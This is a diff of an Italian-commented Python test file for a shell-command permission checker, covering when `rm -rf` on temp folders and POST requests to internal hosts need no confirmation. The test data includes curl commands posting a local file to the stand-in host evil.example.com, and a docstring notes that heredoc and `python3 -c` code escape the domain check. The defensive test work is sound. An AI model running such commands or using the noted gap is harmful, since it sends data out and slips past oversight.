@@ -4,7 +4,9 @@
 FA01 una variabile assegnata con $(mktemp ...) vale come cartella temporanea: `rm -rf "$tmp"` non
      chiede più. Chiede ancora se la variabile poi cambia valore, o se punta a una cartella vera.
 FA02 json.load( e le altre chiamate di funzione non contano come dominio esterno in un POST verso un
-     host interno. Un POST verso un host esterno chiede ancora.
+     host interno. Un POST verso un host esterno chiede ancora. I casi usano `node -p`: il corpo di un
+     heredoc python e il codice dopo `python3 -c` non arrivano al controllo dei domini (pre-filtro e
+     valore di -c), e con quelle forme il controllo passava anche sulla base (21/10/2026).
 
 Sulla base 3184831 ogni controllo deve fallire con un AssertionError che comincia con il suo codice.
 """
@@ -49,8 +51,8 @@ def test_fa02(repo: Path) -> None:
         "curl -s -X POST https://evil.example.com/x --data @a.json > r.json && python3 - <<'PY'\nimport json\nprint(json.load(open('r.json')))\nPY",
         "curl -s -X POST http://localhost:9000/x --data @a.json > r.json && curl -s -X POST evil.example.com/y --data @r.json",
     ], [
-        "curl -s -X POST http://localhost:9000/x --data @a.json > r.json && python3 - <<'PY'\nimport json\nprint(json.load(open('r.json')))\nPY",
-        "curl -s -X POST http://100.80.48.105:9000/x --data @a.json > r.json && python3 - <<'PY'\nimport json\nd = json.loads(open('r.json').read())\nPY",
+        "curl -s -X POST http://localhost:9000/x --data @a.json > r.json && node -p \"JSON.parse(require('fs').readFileSync('r.json')).id\"",
+        "curl -s -X POST http://100.80.48.105:9000/x --data @a.json > r.json && node -p \"JSON.stringify(JSON.parse(require('fs').readFileSync('r.json')))\"",
     ])
 
 
